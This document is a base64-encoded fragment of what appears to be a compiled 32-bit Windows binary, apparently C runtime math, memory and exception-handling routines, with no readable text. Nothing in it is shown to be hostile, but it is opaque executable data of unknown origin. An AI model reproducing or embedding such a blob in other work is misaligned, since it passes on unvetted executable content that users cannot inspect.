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O2e6D+AF1BgrtdALZ4MPGhXD///8C2y2gbAEQg/gBde0K7XTp2eDr5d3Y6Q0CAADd2Om1AgAAWNnkm929YP///5v2hWH///8BdQ/d2NstoGwBEArtdALZ4MPGhXD///8E6dcBAADd2N3Y2y2gbAEQxoVw////A8MKyXWv3djbLaBsARDD2cDZ4dstvmwBEN7Zm929YP///5v2hWH///9BdZXZwNn82eSb3b1g////m4qVYf///9nJ2OHZ5JvdvWD////Z4dnww9nA2fzY2Zvf4J51GtnA3A3SbAEQ2cDZ/N7Zm9/gnnQNuAEAAADDuAAAAADr+LgCAAAA6/FWg+x0i/RWg+wI3Rwkg+wI3Rwkm912COhWCAAAg8QU3WYI3QaDxHRehcB0BenQAQAAw8zMzMzMzMzMzIB6DgV1EWaLnVz///+AzwKA5/6zP+sEZrs/E2aJnV7////ZrV7///+7Lm0BENnliZVs////m929YP///8aFcP///wCbio1h////0OHQ+dDBisEkD9cPvsCB4QQEAACL2gPYg8MQ/yOAeg4FdRFmi51c////gM8CgOf+sz/rBGa7PxNmiZ1e////2a1e////uy5tARDZ5YmVbP///5vdvWD////GhXD///8A2cmKjWH////Z5ZvdvWD////ZyYqtYf///9Dl0P3QxYrFJA/XiuDQ4dD50MGKwSQP19Dk0OQKxA++wIHhBAQAAIvaA9iDwxD/I+jOAAAA2cnd2MPoxAAAAOv23djd2Nnuw93Y3djZ7oTtdALZ4MPd2N3Y2ejD271i////261i////9oVp////QHQIxoVw////AMPGhXD///8A3AUebQEQw9nJ271i////261i////9oVp////QHQJxoVw////AOsHxoVw////AN7Bw9u9Yv///9utYv////aFaf///0B0INnJ271i////261i////9oVp////QHQJxoVw////AOsHxoVw////Ad7Bw93Y3djbLQBtARCAvXD///8AfwfGhXD///8BCsnD3djd2NstFG0BEArtdALZ4ArJdAjdBSZtARDeycMKyXQC2eDDzMzMzMzMzMzMzMzM2cDZ/Nzh2cnZ4Nnw2ejewdn93dnDi1QkBIHiAAMAAIPKf2aJVCQG2WwkBsOpAAAIAHQGuAAAAADD3AVAbQEQuAAAAADDi0IEJQAA8H89AADwf3QD3QLDi0IEg+wKDQAA/3+JRCQGi0IEiwoPpMgLweELiUQkBIkMJNssJIPECqkAAAAAi0IEw4tEJAglAADwfz0AAPB/dAHDi0QkCMNmgTwkfwJ0A9ksJFrDZosEJGY9fwJ0HmaD4CB0FZvf4GaD4CB0DLgIAAAA6NkAAABaw9ksJFrDg+wI3RQki0QkBIPECCUAAPB/6xSD7AjdFCSLRCQEg8QIJQAA8H90PT0AAPB/dF9miwQkZj1/AnQqZoPgIHUhm9/gZoPgIHQYuAgAAACD+h10B+h7AAAAWsPoXQAAAFrD2SwkWsPdBWxtARDZydn93dnZwNnh3B1cbQEQm9/gnrgEAAAAc8fcDXxtARDrv90FZG0BENnJ2f3d2dnA2eHcHVRtARCb3+CeuAMAAAB2ntwNdG0BEOuWzMzMzFWL7IPE4IlF4ItFGIlF8ItFHIlF9OsJVYvsg8TgiUXg3V34iU3ki0UQi00UiUXoiU3sjUUIjU3gUFFS6JIFAACDxAzdRfhmgX0IfwJ0A9ltCMnDi/9Vi+yD7CShBOABEDPFiUX8gz2Y8QEQAFZXdBD/NbjxARD/FSAgARCL+OsFv4yyABCLRRSD+BoPjyEBAAAPhA8BAACD+A4Pj6cAAAAPhI4AAABqAlkrwXR4g+gBdGqD6AV0VoPoAQ+FmwEAAMdF4IhtARCLRQiLz4t1EMdF3AEAAADdAItFDN1d5N0AjUXc3V3s3QZQ3V30/xVQIQEQ/9dZhcAPhVkBAADoi4H//8cAIQAAAOlJAQAAiU3cx0XgiG0BEOkEAQAAx0XghG0BEOuiiU3cx0XghG0BEOnsAAAAx0XcAwAAAMdF4JBtARDp2QAAAIPoD3RRg+gJdEOD6AEPhQEBAADHReCUbQEQi0UIi8+LdRDHRdwEAAAA3QCLRQzdXeTdAI1F3N1d7N0GUN1d9P8VUCEBEP/XWenCAAAAx0XcAwAAAOt8x0XgkG0BEOu72eiLRRDdGOmpAAAAg+gbdFuD6AF0SoPoFXQ5g+gJdCiD6AN0Fy2rAwAAdAmD6AEPhYAAAACLRQjdAOvGx0XgmG0BEOnZ/v//x0XgoG0BEOnN/v//x0XgqG0BEOnB/v//x0XglG0BEOm1/v//x0XcAgAAAMdF4JRtARCLRQiLz4t1EN0Ai0UM3V3k3QCNRdzdXezdBlDdXfT/FVAhARD/11mFwHUL6D2A///HACIAAADdRfTdHotN/F8zzV7oGh3//4vlXcOL/1WL7FFRU1a+//8AAFZoPxsAAOggAQAA3UUIi9hZWQ+3TQ648H8AACPIUVHdHCRmO8h1N+gYDAAASFlZg/gCdw5WU+jwAAAA3UUIWVnrY91FCN0FsG0BEFOD7BDYwd1cJAjdHCRqDGoI6z/oAQQAAN1V+N1FCIPECN3h3+D2xER6Elbd2VPd2OirAAAA3UX4WVnrHvbDIHXpU4PsENnJ3VwkCN0cJGoMahDoDAQAAIPEHF5bi+Vdw8zMzMzMzMzMzMzMzFWL7FdWU4tNEAvJdE2LdQiLfQy3QbNatiCNSQCKJgrkigd0JwrAdCODxgGDxwE653IGOuN3AgLmOsdyBjrDdwICxjrgdQuD6QF10TPJOuB0Cbn/////cgL32YvBW15fycOL/1WL7FHdffzb4g+/RfyL5V3Di/9Vi+xRUZvZffyLTQyLRQj30WYjTfwjRQxmC8hmiU342W34D79F/IvlXcOL/1WL7ItNCIPsDPbBAXQK2y24bQEQ2138m/bBCHQQm9/g2y24bQEQ3V30m5vf4PbBEHQK2y3EbQEQ3V30m/bBBHQJ2e7Z6N7x3dib9sEgdAbZ691d9JuL5V3Di/9Vi+xRm919/A+/RfyL5V3Di/9Vi+xRUd1FCFFR3Rwk6MoKAABZWaiQdUrdRQhRUd0cJOh5AgAA3UUI3eHf4FlZ3dn2xER6K9wN8HUBEFFR3VX43Rwk6FYCAADdRfja6d/gWVn2xER6BWoCWOsJM8BA6wTd2DPAi+Vdw4v/VYvs3UUIuQAA8H/Z4bgAAPD/OU0UdTuDfRAAdXXZ6NjR3+D2xAV6D93Z3djdBYB3ARDp6QAAANjR3+Dd2fbEQYtFGA+F2gAAAN3Y2e7p0QAAADlFFHU7g30QAHU12ejY0d/g9sQFegvd2d3Y2e7prQAAANjR3+Dd2fbEQYtFGA+FngAAAN3Y3QWAdwEQ6ZEAAADd2DlNDHUug30IAA+FggAAANnu3UUQ2NHf4PbEQQ+Ec////9jZ3+D2xAWLRRh7Yt3Y2ejrXDlFDHVZg30IAHVT3UUQUVHdHCTotf7//9nu3UUQWVnY0YvI3+D2xEF1E93Z3djdBYB3ARCD+QF1INng6xzY2d/g9sQFeg+D+QF1Dt3Y3QWQdwEQ6wTd2Nnoi0UY3RgzwF3Di/9Ti9xRUYPk8IPEBFWLawSJbCQEi+yB7IgAAAChBOABEDPFiUX8i0MQVotzDFcPtwiJjXz///+LBoPoAXQpg+gBdCCD6AF0F4PoAXQOg+gBdBWD6AN1cmoQ6w5qEusKahHrBmoE6wJqCF9RjUYYUFforQEAAIPEDIXAdUeLSwiD+RB0EIP5FnQLg/kddAaDZcD+6xKLRcDdRhCD4OODyAPdXbCJRcCNRhhQjUYIUFFXjYV8////UI1FgFDoQgMAAIPEGIuNfP///2j//wAAUej9/P//gz4IWVl0FOjcq///hMB0C1bo/6v//1mFwHUI/zboIAYAAFmLTfxfM81e6KsY//+L5V2L41vDi/9Vi+xRUd1FCNn83V343UX4i+Vdw4v/VYvsi0UIqCB0BGoF6xeoCHQFM8BAXcOoBHQEagLrBqgBdAVqA1hdww+2wIPgAgPAXcOL/1OL3FFRg+Twg8QEVYtrBIlsJASL7IHsiAAAAKEE4AEQM8WJRfxWi3MgjUMYV1ZQ/3MI6JUAAACDxAyFwHUmg2XA/lCNQxhQjUMQUP9zDI1DIP9zCFCNRYBQ6HECAACLcyCDxBz/cwjoXv///1mL+Ojyqv//hMB0KYX/dCXdQxhWg+wY3VwkENnu3VwkCN1DEN0cJP9zDFfoUwUAAIPEJOsYV+gZBQAAxwQk//8AAFbox/v//91DGFlZi038XzPNXuiTF///i+Vdi+Nbw4v/VYvsg+wQU4tdCFaL84PmH/bDCHQW9kUQAXQQagHot/v//1mD5vfpkAEAAIvDI0UQqAR0EGoE6J77//9Zg+b76XcBAAD2wwEPhJoAAAD2RRAID4SQAAAAagjoe/v//4tFEFm5AAwAACPBdFQ9AAQAAHQ3PQAIAAB0GjvBdWKLTQzZ7twZ3+DdBYh3ARD2xAV7TOtIi00M2e7cGd/g9sQFeyzdBYh3ARDrMotNDNnu3Bnf4PbEBXoe3QWIdwEQ6x6LTQzZ7twZ3+D2xAV6CN0FgHcBEOsI3QWAdwEQ2eDdGYPm/unUAAAA9sMCD4TLAAAA9kUQEA+EwQAAAFcz//bDEHQBR4tNDN0B2e7a6d/g9sRED4uRAAAA3QGNRfxQUVHdHCTonAQAAItF/IPEDAUA+v//iUX83VXw2e49zvv//30HM//eyUfrWd7ZM9Lf4PbEQXUBQotF9rkD/P//g+APg8gQZolF9otF/DvBfSsryItF8PZF8AF0BYX/dQFH0ej2RfQBiUXwdAgNAAAAgIlF8NFt9IPpAXXa3UXwhdJ0Atngi0UM3RjrAzP/R4X/X3QIahDoIvr//1mD5v32wxB0EfZFECB0C2og6Az6//9Zg+bvM8CF9l4PlMBbi+Vdw4v/VYvsagD/dRz/dRj/dRT/dRD/dQz/dQjoBQAAAIPEHF3Di/9Vi+yLRQgzyVMz20OJSASLRQhXvw0AAMCJSAiLRQiJSAyLTRD2wRB0C4tFCL+PAADACVgE9sECdAyLRQi/kwAAwINIBAL2wQF0DItFCL+RAADAg0gEBPbBBHQMi0UIv44AAMCDSAQI9sEIdAyLRQi/kAAAwINIBBCLTQhWi3UMiwbB4AT30DNBCIPgEDFBCItNCIsGA8D30DNBCIPgCDFBCItNCIsG0ej30DNBCIPgBDFBCItNCIsGwegD99AzQQiD4AIxQQiLBotNCMHoBffQM0EII8MxQQjoVPn//4vQ9sIBdAeLTQiDSQwQ9sIEdAeLRQiDSAwI9sIIdAeLRQiDSAwE9sIQdAeLRQiDSAwC9sIgdAaLRQgJWAyLBrkADAAAI8F0NT0ABAAAdCI9AAgAAHQMO8F1KYtFCIMIA+shi00IiwGD4P6DyAKJAesSi00IiwGD4P0Lw+vwi0UIgyD8iwa5AAMAACPBdCA9AAIAAHQMO8F1IotFCIMg4+sai00IiwGD4OeDyATrC4tNCIsBg+Drg8gIiQGLRQiLTRTB4QUzCIHh4P8BADEIi0UICVggg30gAHQsi0UIg2Ag4YtFGNkAi0UI2VgQi0UICVhgi0UIi10cg2Bg4YtFCNkD2VhQ6zqLTQiLQSCD4OODyAKJQSCLRRjdAItFCN1YEItFCAlYYItNCItdHItBYIPg44PIAolBYItFCN0D3VhQ6HX3//+NRQhQagFqAFf/FYwgARCLTQj2QQgQdAODJv72QQgIdAODJvv2QQgEdAODJvf2QQgCdAODJu/2QQgBdAODJt+LAbr/8///g+ADg+gAdDWD6AF0IoPoAXQNg+gBdSiBDgAMAADrIIsGJf/7//8NAAgAAIkG6xCLBiX/9///DQAEAADr7iEWiwHB6AKD4AeD6AB0GYPoAXQJg+gBdRohFusWiwYjwg0AAgAA6wmLBiPCDQADAACJBoN9IABedAfZQVDZG+sF3UFQ3RtfW13Di/9Vi+yLRQiD+AF0FYPA/oP4AXcY6Ip1///HACIAAABdw+h9df//xwAhAAAAXcOL/1WL7ItVDIPsIDPJi8E5FMWIdgEQdAhAg/gdfPHrB4sMxYx2ARCJTeSFyXRVi0UQiUXoi0UUiUXsi0UYiUXwi0UcVot1CIlF9ItFIGj//wAA/3UoiUX4i0UkiXXgiUX86Cb2//+NReBQ6DWl//+DxAyFwHUHVuhV////Wd1F+F7rG2j//wAA/3Uo6Pz1////dQjoOf///91FIIPEDIvlXcOL/1WL7N1FCNnu3eHf4Ff2xER6Cd3ZM//prwAAAFZmi3UOD7fGqfB/AAB1fItNDItVCPfB//8PAHUEhdJ0at7ZvwP8///f4PbEQXUFM8BA6wIzwPZFDhB1HwPJiU0MhdJ5BoPJAYlNDAPST/ZFDhB06GaLdQ6JVQi57/8AAGYj8WaJdQ6FwHQMuACAAABmC/BmiXUO3UUIagBRUd0cJOgxAAAAg8QM6yNqAFHd2FHdHCToHgAAAA+3/oPEDMHvBIHn/wcAAIHv/gMAAF6LRRCJOF9dw4v/VYvsUVGLTRAPt0UO3UUIJQ+AAADdXfiNif4DAADB4QQLyGaJTf7dRfiL5V3Di/9Vi+yBfQwAAPB/i0UIdQeFwHUVQF3DgX0MAADw/3UJhcB1BWoCWF3DZotNDrr4fwAAZiPKZjvKdQRqA+vouvB/AABmO8p1EfdFDP//BwB1BIXAdARqBOvNM8Bdw4v/VYvsZotNDrrwfwAAZovBZiPCZjvCdTPdRQhRUd0cJOh8////WVmD6AF0GIPoAXQOg+gBdAUzwEBdw2oC6wJqBFhdw7gAAgAAXcMPt8mB4QCAAABmhcB1HvdFDP//DwB1BoN9CAB0D/fZG8mD4ZCNgYAAAABdw91FCNnu2unf4PbERHoM99kbyYPh4I1BQF3D99kbyYHhCP///42BAAEAAF3DzP8lUCABEP8llCABEP8lACABEMzMzMzMzMzMzMzMzMzMUY1MJAgryIPhDwPBG8kLwVnpegQAAFGNTCQIK8iD4QcDwRvJC8FZ6WQEAACLTfRkiQ0AAAAAWV9fXluL5V1R8sOLTfAzzfLoVQ////Lp2v///1Bk/zUAAAAAjUQkDCtkJAxTVleJKIvooQTgARAzxVD/dfzHRfz/////jUX0ZKMAAAAA8sNQZP81AAAAAI1EJAwrZCQMU1ZXiSiL6KEE4AEQM8VQiUXw/3X8x0X8/////41F9GSjAAAAAPLDUGT/NQAAAACNRCQMK2QkDFNWV4koi+ihBOABEDPFUIll8P91/MdF/P////+NRfRkowAAAADyw8zMzMzMzMzMzMzMzFWL7ItFCDPSU1ZXi0g8A8gPt0EUD7dZBoPAGAPBhdt0G4t9DItwDDv+cgmLSAgDzjv5cgpCg8AoO9Ny6DPAX15bXcPMzMzMzMzMzMzMzMzMVYvsav5o+MsBEGjAPgAQZKEAAAAAUIPsCFNWV6EE4AEQMUX4M8VQjUXwZKMAAAAAiWXox0X8AAAAAGgAAAAQ6HwAAACDxASFwHRUi0UILQAAABBQaAAAABDoUv///4PECIXAdDqLQCTB6B/30IPgAcdF/P7///+LTfBkiQ0AAAAAWV9eW4vlXcOLReyLADPJgTgFAADAD5TBi8HDi2Xox0X8/v///zPAi03wZIkNAAAAAFlfXluL5V3DzMzMzMzMVYvsi0UIuU1aAABmOQh0BDPAXcOLSDwDyDPAgTlQRQAAdQy6CwEAAGY5URgPlMBdw8zMzMzMzMzMzMzMzMzMzFaLRCQUC8B1KItMJBCLRCQMM9L38YvYi0QkCPfxi/CLw/dkJBCLyIvG92QkEAPR60eLyItcJBCLVCQMi0QkCNHp0dvR6tHYC8l19Pfzi/D3ZCQUi8iLRCQQ9+YD0XIOO1QkDHcIcg87RCQIdglOK0QkEBtUJBQz2ytEJAgbVCQM99r32IPaAIvKi9OL2YvIi8ZewhAAzMzMzMzMzMzMzMxowD4AEGT/NQAAAACLRCQQiWwkEI1sJBAr4FNWV6EE4AEQMUX8M8WJReRQiWXo/3X4i0X8x0X8/v///4lF+I1F8GSjAAAAAPLDi03kM83y6F0M///y6fwX///MzMzMzMyLRCQIi0wkEAvIi0wkDHUJi0QkBPfhwhAAU/fhi9iLRCQI92QkFAPYi0QkCPfhA9NbwhAAzMzMzMzMzMzMzMzMV1ZVM/8z7YtEJBQLwH0VR0WLVCQQ99j32oPYAIlEJBSJVCQQi0QkHAvAfRRHi1QkGPfY99qD2ACJRCQciVQkGAvAdSiLTCQYi0QkFDPS9/GL2ItEJBD38Yvwi8P3ZCQYi8iLxvdkJBgD0etHi9iLTCQYi1QkFItEJBDR69HZ0erR2AvbdfT38Yvw92QkHIvIi0QkGPfmA9FyDjtUJBR3CHIPO0QkEHYJTitEJBgbVCQcM9srRCQQG1QkFE15B/fa99iD2gCLyovTi9mLyIvGT3UH99r32IPaAF1eX8IQAMyA+UBzFYD5IHMGD63Q0+rDi8Iz0oDhH9PowzPAM9LDzFGNTCQEK8gbwPfQI8iLxCUA8P//O8jycguLwVmUiwCJBCTywy0AEAAAhQDr58zMzID5QHMVgPkgcwYPpcLT4MOL0DPAgOEf0+LDM8Az0sPMgz0E7AEQAHQ3VYvsg+wIg+T43Rwk8g8sBCTJw4M9BOwBEAB0G4PsBNk8JFhmg+B/ZoP4f3TTjaQkAAAAAI1JAFWL7IPsIIPk8NnA2VQkGN98JBDfbCQQi1QkGItEJBCFwHQ83umF0nke2RwkiwwkgfEAAACAgcH///9/g9AAi1QkFIPSAOss2RwkiwwkgcH///9/g9gAi1QkFIPaAOsUi1QkFPfC////f3W42VwkGNlcJBjJw8zMzMzMzMzMzMzMV1aLdCQQi0wkFIt8JAyLwYvRA8Y7/nYIO/gPgpQCAACD+SAPgtIEAACB+YAAAABzEw+6JRDgARABD4KOBAAA6eMBAAAPuiUI7AEQAXMJ86SLRCQMXl/Di8czxqkPAAAAdQ4PuiUQ4AEQAQ+C4AMAAA+6JQjsARAAD4OpAQAA98cDAAAAD4WdAQAA98YDAAAAD4WsAQAAD7rnAnMNiwaD6QSNdgSJB41/BA+65wNzEfMPfg6D6QiNdghmD9YPjX8I98YHAAAAdGUPuuYDD4O0AAAAZg9vTvSNdvSL/2YPb14Qg+kwZg9vRiBmD29uMI12MIP5MGYPb9NmDzoP2QxmD38fZg9v4GYPOg/CDGYPf0cQZg9vzWYPOg/sDGYPf28gjX8wfbeNdgzprwAAAGYPb074jXb4jUkAZg9vXhCD6TBmD29GIGYPb24wjXYwg/kwZg9v02YPOg/ZCGYPfx9mD2/gZg86D8IIZg9/RxBmD2/NZg86D+wIZg9/byCNfzB9t412COtWZg9vTvyNdvyL/2YPb14Qg+kwZg9vRiBmD29uMI12MIP5MGYPb9NmDzoP2QRmD38fZg9v4GYPOg/CBGYPf0cQZg9vzWYPOg/sBGYPf28gjX8wfbeNdgSD+RB8E/MPbw6D6RCNdhBmD38PjX8Q6+gPuuECcw2LBoPpBI12BIkHjX8ED7rhA3MR8w9+DoPpCI12CGYP1g+NfwiLBI20FwEQ/+D3xwMAAAB0E4oGiAdJg8YBg8cB98cDAAAAde2L0YP5IA+CrgIAAMHpAvOlg+ID/ySVtBcBEP8kjcQXARCQxBcBEMwXARDYFwEQ7BcBEItEJAxeX8OQigaIB4tEJAxeX8OQigaIB4pGAYhHAYtEJAxeX8ONSQCKBogHikYBiEcBikYCiEcCi0QkDF5fw5CNNDGNPDmD+SAPglEBAAAPuiUQ4AEQAQ+ClAAAAPfHAwAAAHQUi9eD4gMryopG/4hH/05Pg+oBdfOD+SAPgh4BAACL0cHpAoPiA4PuBIPvBP3zpfz/JJVgGAEQkHAYARB4GAEQiBgBEJwYARCLRCQMXl/DkIpGA4hHA4tEJAxeX8ONSQCKRgOIRwOKRgKIRwKLRCQMXl/DkIpGA4hHA4pGAohHAopGAYhHAYtEJAxeX8P3xw8AAAB0D0lOT4oGiAf3xw8AAAB18YH5gAAAAHJoge6AAAAAge+AAAAA8w9vBvMPb04Q8w9vViDzD29eMPMPb2ZA8w9vblDzD292YPMPb35w8w9/B/MPf08Q8w9/VyDzD39fMPMPf2dA8w9/b1DzD393YPMPf39wgemAAAAA98GA////dZCD+SByI4PuIIPvIPMPbwbzD29OEPMPfwfzD39PEIPpIPfB4P///3Xd98H8////dBWD7wSD7gSLBokHg+kE98H8////deuFyXQPg+8Bg+4BigaIB4PpAXXxi0QkDF5fw+sDzMzMi8aD4A+FwA+F4wAAAIvRg+F/weoHdGaNpCQAAAAAi/9mD28GZg9vThBmD29WIGYPb14wZg9/B2YPf08QZg9/VyBmD39fMGYPb2ZAZg9vblBmD292YGYPb35wZg9/Z0BmD39vUGYPf3dgZg9/f3CNtoAAAACNv4AAAABKdaOFyXRfi9HB6gWF0nQhjZsAAAAA8w9vBvMPb04Q8w9/B/MPf08QjXYgjX8gSnXlg+EfdDCLwcHpAnQPixaJF4PHBIPGBIPpAXXxi8iD4QN0E4oGiAdGR0l1942kJAAAAACNSQCLRCQMXl/DjaQkAAAAAIv/uhAAAAAr0CvKUYvCi8iD4QN0CYoWiBdGR0l198HoAnQNixaJF412BI1/BEh181np6f7//8zMzMzMzMzMzMzMzFWL7FeDPQTsARABD4L9AAAAi30Id3cPtlUMi8LB4ggL0GYPbtryD3DbAA8W27kPAAAAI8+DyP/T4Cv5M9LzD28PZg/v0mYPdNFmD3TLZg/XyiPIdRhmD9fJI8gPvcEDx4XJD0XQg8j/g8cQ69BTZg/X2SPY0eEzwCvBI8hJI8tbD73BA8eFyQ9Ewl/Jww+2VQyF0nQ5M8D3xw8AAAB0FQ+2DzvKD0THhcl0IEf3xw8AAAB162YPbsKDxxBmDzpjR/BAjUwP8A9CwXXtX8nDuPD///8jx2YP78BmD3QAuQ8AAAAjz7r/////0+JmD9f4I/p1FGYP78BmD3RAEIPAEGYP1/iF/3TsD7zXA8LrvYt9CDPAg8n/8q6DwQH32YPvAYpFDP3yroPHATgHdAQzwOsCi8f8X8nDzMzMzMzMzMzMgz0E7AEQAXJfD7ZEJAiL0MHgCAvQZg9u2vIPcNsADxbbi1QkBLkPAAAAg8j/I8rT4CvR8w9vCmYP79JmD3TRZg90y2YP69FmD9fKI8h1CIPI/4PCEOvcD7zBA8JmD37aM8k6EA9FwcMzwIpEJAhTi9jB4AiLVCQI98IDAAAAdBWKCoPCATrLdFmEyXRR98IDAAAAdesL2FeLw8HjEFYL2IsKv//+/n6LwYv3M8sD8AP5g/H/g/D/M88zxoPCBIHhAAEBgXUhJQABAYF00yUAAQEBdQiB5gAAAIB1xF5fWzPAw41C/1vDi0L8OsN0NoTAdOo643QnhOR04sHoEDrDdBWEwHTXOuN0BoTkdM/rkV5fjUL/W8ONQv5eX1vDjUL9Xl9bw41C/F5fW8PMzMzMzGoM/3Xw6BgC//9ZWcOLVCQIjUIMi0rsM8jo8wH//7hgxQEQ6XAp//+NTQjprvf+/2oM/3Xo6OgB//9ZWcONTejpAPz+/41N2OlT/P7/jU246Uv8/v+NTcjpQ/z+/4tUJAiNQgyLSrAzyOijAf//i0r8M8jomQH//7iExQEQ6RYp//+NTeTpVPf+/41N3OlM9/7/jU3U6av7/v+NTeDpPPf+/41N2Omb+/7/i1QkCI1CDItKxDPI6FYB//+LSvwzyOhMAf//uNjFARDpySj//4tUJAiNQgyLSuwzyOgxAf//uEjIARDprij//8zMzMzMzGgY4AEQ/xUwIQEQwwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA